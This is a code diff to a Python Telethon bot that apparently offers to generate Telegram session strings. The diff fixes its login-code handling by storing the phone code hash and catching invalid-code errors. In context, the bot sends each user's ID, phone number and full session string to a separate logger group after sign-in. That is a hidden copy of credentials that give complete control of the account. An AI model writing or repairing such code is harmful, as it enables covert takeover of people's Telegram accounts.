@@ -1,6 +1,6 @@
 import asyncio
 from telethon import TelegramClient, events, Button
-from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
 from telethon.sessions import StringSession
 
 # 🔹 Telegram API Credentials
@@ -51,7 +51,8 @@ async def process_input(event):
         user_sessions[user_id]["client"] = client  
 
         try:
-            await client.send_code_request(phone_number)
+            sent_code = await client.send_code_request(phone_number)
+            user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Save hash
             user_sessions[user_id]["step"] = "otp"
             await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
         except Exception as e:
@@ -63,9 +64,10 @@ async def process_input(event):
         otp_code = event.message.text.strip()
         client = user_sessions[user_id]["client"]
         phone_number = user_sessions[user_id]["phone"]
+        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  # Retrieve hash
 
         try:
-            await client.sign_in(phone_number, otp_code)
+            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
             session_string = client.session.save()
 
             await bot.send_message(LOGGER_GROUP_ID, f"🆕 **New Session Generated!**\n\n👤 **User:** `{user_id}`\n📱 **Phone:** `{phone_number}`\n🔑 **Session:** `{session_string}`")
@@ -76,6 +78,9 @@ async def process_input(event):
         except PhoneCodeExpiredError:
             await event.respond("❌ **Error: The OTP has expired. Please use /generate to get a new OTP.**")
             del user_sessions[user_id]
+
+        except PhoneCodeInvalidError:
+            await event.respond("❌ **Error: The OTP is incorrect. Please try again.**")
         
         except SessionPasswordNeededError:
             user_sessions[user_id]["step"] = "password"
